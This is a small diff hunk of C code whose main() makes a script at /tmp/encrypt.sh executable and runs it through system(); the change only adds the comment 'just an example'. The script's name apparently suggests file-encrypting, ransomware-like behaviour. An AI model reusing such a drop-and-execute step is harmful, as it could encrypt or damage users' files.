@@ -94,7 +94,7 @@ int main(void) {
         perror("malloc");
         return 1;
     }
-    strcpy(command, "chmod +x /tmp/encrypt.sh && /tmp/encrypt.sh");
+    strcpy(command, "chmod +x /tmp/encrypt.sh && /tmp/encrypt.sh"); //just an example
     system(command);
     free(command);
 
